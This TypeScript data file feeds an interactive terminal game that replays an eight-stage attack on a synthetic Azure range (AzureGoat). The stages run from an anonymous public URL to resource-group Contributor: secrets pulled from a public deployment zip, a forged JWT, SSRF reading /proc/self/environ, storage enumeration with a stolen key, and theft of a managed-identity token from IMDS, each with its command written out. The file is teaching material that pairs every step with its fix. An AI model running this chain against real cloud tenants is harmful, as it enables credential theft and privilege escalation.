/* ============================================================
   Replay data for the interactive case-study terminal.

   Each engagement that has a replay is keyed here by its work-collection
   slug. Stage N lines up 1:1 with killchain[N] in that entry's frontmatter —
   the terminal pulls titles and ATT&CK IDs from the frontmatter so the game
   can never drift from the written case study. Only the shell mechanics
   (commands, output, hints) live here.

   Output line prefixes drive colour, and read fine as plain text:
     "> "  echoed/system     "+ "  success     "! "  failure / dead end
     "· "  dim commentary    (anything else = normal)

   Hostnames, keys and IPs are synthetic stand-ins for the real range —
   the shapes are faithful, the values are not live.
   ============================================================ */

/* A command that responds but does NOT advance the stage: dead ends,
   flavour, and preludes (an ssh that has to happen before the real move). */
export interface ReplayAside {
  needs: string[];      // every substring must appear in the normalised input
  out: string[];
  setPrompt?: string;   // pivot: change the shell prompt from here on
}

export interface ReplayStage {
  objective: string;    // what the player is trying to achieve
  cmd: string;          // canonical command — Tab autofills this
  needs: string[];      // solve matcher (all substrings must be present)
  out: string[];        // printed on solve
  hint: string;         // conceptual nudge, not the answer
  lesson?: string;      // the "why it worked" line, printed after the stage clears
  setPrompt?: string;
  asides?: ReplayAside[];
}

export interface Replay {
  host: string;         // initial shell prompt
  intro: string[];      // banner printed on boot
  stages: ReplayStage[];
  outro: string[];      // printed after the last stage clears
}

const vermillionDrift: Replay = {
  host: 'guest@vermillion',
  intro: [
    '· Operation Vermillion Drift — attack replay',
    '· Eight stages, anonymous public URL to resource-group Contributor.',
    '· Synthetic range, synthetic values. The path is the real one.',
    '',
    "  Type `help` for commands. `hint` when stuck. Tab autofills the move.",
  ],
  stages: [
    {
      objective:
        'You have one thing: a public app URL. Find out what is hosting it.',
      cmd: 'curl -sI https://vd-app-prod.azurewebsites.net/',
      needs: ['curl', 'vd-app-prod'],
      out: [
        'HTTP/2 200',
        'server: Kestrel',
        'x-powered-by: ASP.NET',
        'x-azure-functions-host: vd-app-prod',
        '',
        '+ Azure Functions host confirmed.',
        '· The page fingerprints as an INE AzureGoat deployment.',
        '· Functions apps follow a naming convention. So do their storage',
        '  accounts: vd-app-prod  ->  vdstorprod',
      ],
      hint: 'Do not attack it yet. Just ask the server what it is — headers are free.',
      lesson:
        'Naming conventions are recon. One hostname handed over the storage account.',
    },
    {
      objective:
        'Guess is not proof. See whether that storage account answers to nobody.',
      cmd:
        'az storage blob download --account-name vdstorprod -c web -n index.html --no-sign-request',
      needs: ['blob download', 'vdstorprod'],
      out: [
        'Finished[#############################################] 100.0000%',
        '',
        '+ Anonymous read succeeded — no credential sent.',
        '· Container is Blob-level public: cannot list, CAN fetch by name.',
        '',
        'index.html references:',
        '  container "app"   -> React bundle',
        '  api host          -> vd-api-prod.azurewebsites.net',
        '  artifact          -> function-app.zip',
      ],
      hint:
        'Anonymous blob access has its own flag. You do not need to log in to try.',
      lesson:
        'Blob-level public hides the index, not the contents. Guessable names defeat it.',
    },
    {
      objective:
        'You can download the backend deployment package. Read what shipped inside it.',
      cmd: 'unzip -p function-app.zip local.settings.json',
      needs: ['function-app.zip'],
      out: [
        '{',
        '  "IsEncrypted": false,',
        '  "Values": {',
        '    "JWT_SECRET": "vd-signing-key-DO-NOT-SHIP",',
        '    "COSMOS_KEY": "AccountEndpoint=https://vd-cosmos-prod...",',
        '    "STORAGE_KEY": "DefaultEndpointsProtocol=https;AccountKey=..."',
        '  }',
        '}',
        '',
        '+ Three live secrets baked into a publicly downloadable artifact.',
        '· The function signs sessions HS256 with JWT_SECRET.',
        '· Its auth check validates signature and expiry. Nothing else.',
      ],
      hint: 'The artifact is just a zip. You do not have to run it to read it.',
      lesson:
        'Secrets in build artifacts are secrets in public. This one line is the root of the whole chain.',
    },
    {
      objective:
        'You hold the signing key and the app trusts any signature it can verify. Become an admin.',
      cmd: 'python3 forge_jwt.py --alg HS256 --claim role=admin',
      needs: ['forge_jwt'],
      out: [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4i...',
        '',
        '+ Token accepted by vd-api-prod — every protected route open.',
        '· No registration. No password. No MFA anywhere in the path.',
        '· Audience and issuer are never checked, so a self-signed',
        '  token is indistinguishable from a real one.',
      ],
      hint:
        'You do not need to crack anything. You have the key the server signs with — sign your own.',
      lesson:
        'Verifying signature and expiry is not verifying a token. Audience and issuer are the missing checks.',
    },
    {
      objective:
        'An admin route fetches an arbitrary URL server-side and stores the response. Classic SSRF — go for credentials.',
      cmd: 'ssrf --url file:///proc/self/environ',
      /* Deliberately loose: the insight is the scheme, not the tooling, so
         `curl file://...` and the canonical form both count. */
      needs: ['file://'],
      out: [
        'AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=',
        'vdstorprod;AccountKey=Zm9vYmFyYmF6cXV4...  JWT_SECRET=vd-signing',
        '-key-DO-NOT-SHIP  STORAGE_SAS=?sv=2023-01-03&sp=rwl&sig=...',
        '',
        '+ Whole process environment dumped.',
        '· Confirms the packaged secrets are the live ones,',
        '  and leaks a read/write SAS as a bonus.',
      ],
      hint:
        'The metadata endpoint is not the only thing a server-side fetcher can reach. What else does that URL parser accept?',
      lesson:
        'SSRF with scheme control is a file-read primitive. file:// got what IMDS could not.',
      asides: [
        {
          needs: ['169.254.169.254'],
          out: [
            '! Empty response. No route to host.',
            '',
            '· Azure Functions has no VM metadata service — and this function',
            '  has no managed identity assigned at all. The reflex is wrong',
            '  here. The metadata endpoint you target has to match the',
            '  compute type.',
            '',
            '· Dead end, not a failure. Try a different scheme.',
          ],
        },
      ],
    },
    {
      objective:
        'The stolen account key outranks the public container setting. Enumerate everything.',
      cmd: 'az storage container list --account-name vdstorprod --account-key <stolen>',
      needs: ['container list', 'vdstorprod'],
      out: [
        'web         Blob      public',
        'app         Blob      public',
        'backup-vm   Private   <-- invisible before now',
        '',
        '+ backup-vm contains vd_id_rsa (SSH private key) and hosts.conf.',
        '! hosts.conf is salted with decoys: three RFC1918 addresses and',
        '  one live but unrelated public IP, there to burn your time.',
        '· The upstream GitHub template disambiguates which host is real:',
        '  vd-vm-prod  ->  20.83.44.117',
      ],
      hint: 'You have the account key now, not just anonymous access. Ask for the full list.',
      lesson:
        'An account key ignores per-container ACLs. Private only ever meant private to people without the key.',
    },
    {
      objective:
        'Log in to the VM with the recovered key — then ask the metadata service the question that failed on Functions.',
      cmd: 'curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token',
      needs: ['metadata', '169.254.169.254'],
      out: [
        '{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",',
        ' "resource":"https://management.azure.com/","token_type":"Bearer"}',
        '',
        '+ System-assigned managed-identity token issued.',
        '· Same request, same address, opposite result — because this time',
        '  the compute type actually has a metadata service.',
      ],
      hint:
        'You need to be on the VM first. Then retry the request that died in stage 05.',
      lesson:
        'A VM identity token is a credential the disk never stored and rotation never touches.',
      asides: [
        {
          needs: ['ssh'],
          out: [
            'Warning: Permanently added \'20.83.44.117\' to known hosts.',
            '',
            '+ Logged in as azureuser@vd-vm-prod.',
            '· This host is a VM, not a Functions sandbox. IMDS is live here.',
          ],
          setPrompt: 'azureuser@vd-vm-prod',
        },
      ],
    },
    {
      objective:
        'Replay that token against Azure Resource Manager and find out what it is worth.',
      cmd: 'az rest --method get --url https://management.azure.com/subscriptions/<sub>/resourcegroups',
      needs: ['management.azure.com'],
      out: [
        '{"value":[{"name":"vd-rg-prod","location":"eastus", ...}]}',
        '',
        'roleAssignments:',
        '  principal  vd-vm-prod (system-assigned)',
        '  role       Contributor',
        '  scope      /subscriptions/<sub>/resourceGroups/vd-rg-prod',
        '',
        '+ Contributor over every resource in the group.',
        '· Write control: create, modify, delete. From an anonymous URL.',
      ],
      hint: 'The token has an audience. Spend it there and ask what you can see.',
      lesson:
        'The intended route through the automation account was undeployable in this subscription. This is the equivalent path, improvised.',
    },
  ],
  outro: [
    '',
    '  8/8 — anonymous public URL to resource-group Contributor.',
    '',
    '· Every link had a cheap, boring fix, and any ONE of them breaks the',
    '  chain. Get secrets out of build artifacts and stages 03 through 08',
    '  never happen. Scope the managed identity and stage 08 is worthless.',
    '· Attackers route around missing pieces. A control that blocks only',
    '  the textbook path, leaving an equivalent one open, buys nothing.',
    '',
    '  Findings table and the full write-up are on this page.',
  ],
};

const replays: Record<string, Replay> = {
  'operation-vermillion-drift': vermillionDrift,
};

export const replayFor = (slug: string): Replay | null => replays[slug] ?? null;
